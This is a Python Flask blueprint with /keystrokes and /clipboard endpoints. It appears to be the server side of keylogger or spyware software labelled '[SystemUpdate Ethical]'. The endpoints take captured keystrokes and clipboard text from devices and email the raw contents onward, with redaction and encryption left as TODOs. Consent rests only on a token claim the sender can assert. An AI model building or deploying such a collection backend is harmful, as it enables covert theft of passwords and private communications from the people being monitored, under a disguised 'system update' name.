from flask import Blueprint, jsonify, request
from flask_jwt_extended import jwt_required, get_jwt
import json
from ..emailer import send_email_report


data_bp = Blueprint("data", __name__)


# Simple consent check stub: require claim consent=true

def _has_consent() -> bool:
    claims = get_jwt() or {}
    return bool(claims.get("consent", False))


def _claims_device_id() -> str:
    claims = get_jwt() or {}
    return str(claims.get("device_id") or claims.get("sub") or "unknown-device")


@data_bp.post("/keystrokes")
@jwt_required()
def post_keystrokes():
    if not _has_consent():
        return jsonify(error="consent_required"), 403
    payload = request.get_json(silent=True) or {}
    # TODO: decrypt, redact, persist
    # Email report (best-effort)
    subject = f"[SystemUpdate Ethical] Keystrokes from { _claims_device_id() }"
    try:
        body = json.dumps(payload, ensure_ascii=False, indent=2)
        err = send_email_report(subject, body)
        status = "emailed" if err is None else f"email_skipped: {err}"
    except Exception as e:
        status = f"email_error: {e.__class__.__name__}"
    return jsonify(status=status, count=len(payload.get("items", []))), 202


@data_bp.post("/clipboard")
@jwt_required()
def post_clipboard():
    if not _has_consent():
        return jsonify(error="consent_required"), 403
    payload = request.get_json(silent=True) or {}
    # TODO: decrypt, redact, persist
    # Email report (best-effort)
    subject = f"[SystemUpdate Ethical] Clipboard from { _claims_device_id() }"
    try:
        body = json.dumps(payload, ensure_ascii=False, indent=2)
        err = send_email_report(subject, body)
        status = "emailed" if err is None else f"email_skipped: {err}"
    except Exception as e:
        status = f"email_error: {e.__class__.__name__}"
    return jsonify(status=status, length=len(payload.get("text", ""))), 202
